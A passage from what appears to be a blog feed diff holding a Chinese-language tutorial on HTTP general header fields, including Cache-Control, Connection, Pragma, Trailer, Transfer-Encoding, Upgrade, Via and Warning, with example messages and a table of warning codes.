-<p><code>public</code>（客户端、代理服务器都可利用缓存）</p>
-<p><code>private</code>（发起请求的浏览器才可以缓存,代理服务器不可用缓存）</p>
-<p><code>no-cache</code>（本地可以用使用缓存，但需要服务器验证后才能使用）</p>
-<p><code>no-store</code>（不做任何缓存）</p>
-<p>到期</p>
-<p><code>max-age=200</code>（服务器缓存到期时间， 秒）</p>
-<p><code>s-maxage=200</code> (代理服务器缓存的到期时间， 秒)</p>
-<h3 id="connection">Connection</h3>
-<p>管理持久连接：决定当前的事务完成后，是否会关闭网络连接。</p>
-<p>Http协议1.1之后默认都是keep-alive（持久连接），1.0则是close（非持久连接）。</p>
-<pre><code>Connection: keep-alive
-Connection: close
-</code></pre>
-<h3 id="date">Date</h3>
-<p>表明创建 HTTP 报文的日期和时间。</p>
-<pre><code>Date: Tue, 03 Jul 2012 04:40:59 GMT
-</code></pre>
-<h3 id="pragma">Pragma</h3>
-<p>Pragma 是 HTTP/1.1 之前版本的历史遗留字段，仅作为与 HTTP/1.0的向后兼容而定义。</p>
-<p>规范定义的形式唯一，如下所示。</p>
-<pre><code>Pragma: no-cache
-</code></pre>
-<p>该首部字段属于通用首部字段，但只用在客户端发送的请求中。客户端会要求所有的中间服务器不返回缓存的资源。</p>
-<p>所有的中间服务器如果都能以 HTTP/1.1 为基准，那直接采用 CacheControl: no-cache 指定缓存的处理方式是最为理想的。但要整体掌握全部中间服务器使用的 HTTP 协议版本却是不现实的。因此，发送的请求会同时含有下面两个首部字段。</p>
-<pre><code>Cache-Control: no-cache
-Pragma: no-cache
-</code></pre>
-<h3 id="trailer">Trailer</h3>
-<p>首部字段 Trailer 会事先说明在报文主体后记录了哪些首部字段。该首部字段可应用在 HTTP/1.1 版本分块传输编码时。</p>
-<pre><code>HTTP/1.1 200 OK
-Date: Tue, 03 Jul 2012 04:40:56 GMT
-Content-Type: text/html
-...
-Transfer-Encoding: chunked
-Trailer: Expires
-...(报文主体)...
-0
-Expires: Tue, 28 Sep 2004 23:59:59 GMT
-</code></pre>
-<p>以上用例中，指定首部字段 Trailer 的值为 Expires，在报文主体之后（分块长度 0 之后）出现了首部字段 Expires。</p>
-<h3 id="transfer-encoding">Transfer-Encoding</h3>
-<p>规定了传输报文主体时采用的编码方式。</p>
-<p>HTTP/1.1 的传输编码方式仅对分块传输编码有效。</p>
-<pre><code>HTTP/1.1 200 OK
-Date: Tue, 03 Jul 2012 04:40:56 GMT
-Cache-Control: public, max-age=604800
-Content-Type: text/javascript; charset=utf-8
-Expires: Tue, 10 Jul 2012 04:40:56 GMT
-X-Frame-Options: DENY
-X-XSS-Protection: 1; mode=block
-Content-Encoding: gzip
-Transfer-Encoding: chunked
-Connection: keep-alive
-cf0 ←16进制(10进制为3312)
-...3312字节分块数据...
-392 ←16进制(10进制为914)
-...914字节分块数据...
-0
-</code></pre>
-<h3 id="upgrade">Upgrade</h3>
-<p>首部字段 Upgrade 用于检测 HTTP 协议及其他协议是否可使用更高的版本进行通信，其参数值可以用来指定一个完全不同的通信协议。</p>
-<pre><code>GET /index.htm HTTP/1.1
-Upgrade: TLS/1.0
-Connection: Upgrade
-------------------&gt;
-&lt;------------------
-HTTP/1.1 101 Switching Protocols
-Upgrade: TLS/1.0, HTTP/1.1
-Connection: Upgrade
-</code></pre>
-<p>上图用例中，首部字段 Upgrade 指定的值为 TLS/1.0。请注意此处两个字段首部字段的对应关系，Connection 的值被指定为 Upgrade。Upgrade 首部字段产生作用的 Upgrade 对象仅限于客户端和邻接服务器之间。因此，使用首部字段 Upgrade 时，还需要额外指定Connection:Upgrade。</p>
-<p>对于附有首部字段 Upgrade 的请求，服务器可用 101 Switching Protocols 状态码作为响应返回。</p>
-<h3 id="via">Via</h3>
-<p>使用首部字段 Via 是为了追踪客户端与服务器之间的请求和响应报文的传输路径。</p>
-<p>报文经过代理或网关时，会先在首部字段 Via 中附加该服务器的信息，然后再进行转发。</p>
-<p>首部字段 Via 不仅用于追踪报文的转发，还可避免请求回环的发生。所以必须在经过代理时附加该首部字段内容。</p>
-<pre><code>客户端: 
-GET / HTTP/1.1
-
-代理服务器A: 
-GET / HTTP/1.1
-Via: 1.0 gw.hackr.jp (Squid/3.1)
-
-代理服务器B:
-GET / HTTP/1.1
-Via: 1.0 gw.hackr.jp (Squid/3.1), 1.1 a1.example.net(Squid/2.7)
-
-源服务器
-</code></pre>
-<p>上图用例中，在经过代理服务器 A 时，Via 首部附加了“1.0 gw.hackr.jp (Squid/3.1)”这样的字符串值。行头的 1.0 是指接收请求的97服务器上应用的 HTTP 协议版本。接下来经过代理服务器 B 时亦是如此，在 Via 首部附加服务器信息，也可增加 1 个新的 Via 首部写入服务器信息。</p>
-<p>Via 首部是为了追踪传输路径，所以经常会和 TRACE 方法一起使用。比如，代理服务器接收到由 TRACE 方法发送过来的请求（其中Max-Forwards: 0）时，代理服务器就不能再转发该请求了。这种情况下，代理服务器会将自身的信息附加到 Via 首部后，返回该请求的响应。</p>
-<h3 id="warning">Warning</h3>
-<p>用于告知用户一些与缓存相关的问题的警告。</p>
-<p>Warning 首部的格式如下。最后的日期时间部分可省略。</p>
-<pre><code>Warning: [警告码][警告的主机:端口号]“[警告内容]”([日期时间])
-Warning: 112 gw.hacker.jp:8080  &quot;cache down&quot; &quot; Wed, 21 Oct 2015 07:28:00 GMT&quot;
-</code></pre>
-<p><strong>警告码表</strong></p>
-<table>
-<thead>
-<tr>
-<th>警告码</th>
-<th>警告内容</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>110</td>
-<td>Response is stale</td>
-<td>响应已过期：由缓存服务器提供的响应已过期（设置的失效时间已过）。</td>
-</tr>
-<tr>
-<td>111</td>
-<td>Revalidation failed</td>
-<td>再验证失败：由于无法访问服务器，响应验证失败。</td>
-</tr>
-<tr>
-<td>112</td>
-<td>Disconnection operation</td>
-<td>断开连接操作：缓存服务器断开连接。</td>
-</tr>
-<tr>
-<td>113</td>
-<td>Heuristic expiration</td>
-<td>试探性过期：响应的使用期超过24小时（有效缓存的设定时间大于24小时的情况下）</td>
-</tr>
-<tr>
-<td>199</td>
-<td>Miscellaneous warning</td>
-<td>杂项警告：任意的警告内容</td>
-</tr>
-<tr>
-<td>214</td>
-<td>Transformation applied</td>
-<td>使用了转换：由代理服务器添加，如果它对返回的展现内容进行了任何转换，比如改变了内容编码、媒体类型等。</td>
-</tr>
-<tr>
-<td>299</td>
-<td>Miscellaneous persistent warning</td>
-<td>持久杂项警告：任意的警告内容</td>
-</tr>
-</tbody>
-</table>
 ]]></content>
     </entry>
 </feed>
